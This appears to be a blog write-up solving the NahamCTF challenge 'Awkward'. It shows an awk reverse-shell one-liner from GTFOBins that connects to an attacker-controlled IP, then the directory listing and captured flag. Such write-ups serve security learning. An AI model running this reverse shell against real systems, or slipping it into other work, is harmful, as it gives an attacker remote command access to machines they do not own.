---
title: "NahamCTF: Awkward"
categories:
  - NahamCTF
tags:
  - NahamCTF
---

*No output..? Awk-o-taco.*

*Connect here:*
*nc jh2i.com 50025*

---

For this challenge, we get a blank shell that only returns a number, and a message when we send a command:

```
whoami

0... Well this is awkward...
```

From the name of the challenge, we can assume that we need to use awk for this. We'll use a reverse shell from GTFOBins, to give ourselves access to the box. 

*Note: We need to have a publically facing IP address to connect back to in order to return a shell to ourselves.*

Reverse Shell:
```
awk -v RHOST=xx.xx.xx.xx  -v RPORT=xx 'BEGIN {s = "/inet/tcp/0/" RHOST "/" RPORT;while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
```

We can now check in the home directory for this flag:

```
> ls -lah
total 24K
dr-xr-xr-x 1 nobody nogroup 4.0K Jun  4 19:58 .
drwxr-xr-x 1 user   user    4.0K Jun  4 18:54 ..
-rw-r--r-- 1 nobody nogroup  220 Jun  4 18:54 .bash_logout
-rw-r--r-- 1 nobody nogroup 3.7K Jun  4 18:54 .bashrc
-rw-r--r-- 1 nobody nogroup  807 Jun  4 18:54 .profile
drwxr-xr-x 1 user   user    4.0K Jun  4 19:58 this_is_where_the_flag_is_plz_dont_bruteforce

> ls this_is_where_the_flag_is_plz_dont_bruteforce
flag.txt
> cat this_is_where_the_flag_is_plz_dont_bruteforce/flag.txt
flag{okay_well_this_is_even_more_awkward}
```

**flag{okay_well_this_is_even_more_awkward}**

